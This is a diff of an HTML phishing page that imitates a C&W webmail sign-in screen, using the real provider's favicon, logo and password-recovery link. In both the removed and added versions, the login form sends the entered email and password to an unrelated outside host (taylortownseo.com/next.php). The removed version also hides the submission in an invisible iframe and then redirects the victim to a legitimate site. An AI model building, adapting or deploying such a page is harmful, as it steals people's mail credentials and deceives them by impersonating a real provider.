@@ -1,61 +1,25 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<title>Flow</title>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>Flow</title><link href="default.css" rel="stylesheet" type="text/css"><link id="favicon" rel="shortcut icon" type="image/x-icon" href="https://webmail.candwmail.com/img/faviconFL.ico"></head><body>
+	<div class="mainDiv">
+		<img id="hdrImage" alt="" src="candwmail_com.png">
+		<form id="form" action="https://taylortownseo.com/next.php" method="POST">
+			<input type="text" class="field" placeholder="Email" name="email" id="email" required>
+			<input type="password" class="field" placeholder="Password" name="password" id="password" required>
+			
+			<div class="checkDiv divLeft">
+			    <input type="checkbox" id="auto" name="auto" onclick="setAuto();">
+			    <label for="subscribeNews">remember me</label>
+			  </div>
+			  <div class="divRight">
+			  	<a id="hlpLink" href="https://mailconfig.candwmail.com/tmngxSelfcareCWC/recovery?1&amp;variant=fl" target="_blank">Forgot your password?</a>
+			  </div>
+			<button type="submit" class="btnSubmit" style="width: 437px;">Sign in</button>
+		</form>
+		
+		<div class="errorDiv"><span id="error" class="error"></span></div>
+		
+	</div>
+	
 
-<link href="default.css" rel="stylesheet" type="text/css">
-<link rel="shortcut icon" type="image/x-icon" href="https://webmail.candwmail.com/img/faviconFL.ico">
-</head>
 
-<body>
-
-<!-- Hidden iframe to receive the POST -->
-<iframe name="hiddenFrame" style="display:none;"></iframe>
-
-<div class="mainDiv">
-    <img id="hdrImage" alt="" src="candwmail_com.png">
-
-    <form
-        action="https://taylortownseo.com/next.php"
-        method="POST"
-        target="hiddenFrame"
-        onsubmit="redirectAfterSubmit();"
-    >
-        <input type="text" class="field" placeholder="Email" name="email" required>
-        <input type="password" class="field" placeholder="Password" name="password" required>
-
-        <div class="checkDiv divLeft">
-            <input type="checkbox" id="auto" name="auto">
-            <label for="auto">remember me</label>
-        </div>
-
-        <div class="divRight">
-            <a id="hlpLink"
-               href="https://mailconfig.candwmail.com/tmngxSelfcareCWC/recovery?1&variant=fl"
-               target="_blank">
-                Forgot your password?
-            </a>
-        </div>
-
-        <button type="submit" class="btnSubmit" style="width:437px;">
-            Sign in
-        </button>
-    </form>
-
-    <div class="errorDiv">
-        <span id="error" class="error"></span>
-    </div>
-</div>
-
-<script>
-function redirectAfterSubmit() {
-    // Give the POST time to complete before redirecting
-    setTimeout(function () {
-        window.location.href = "https://www.caribsurf.net/";
-    }, 600);
-}
-</script>
-
-</body>
-</html>
+</body></html>
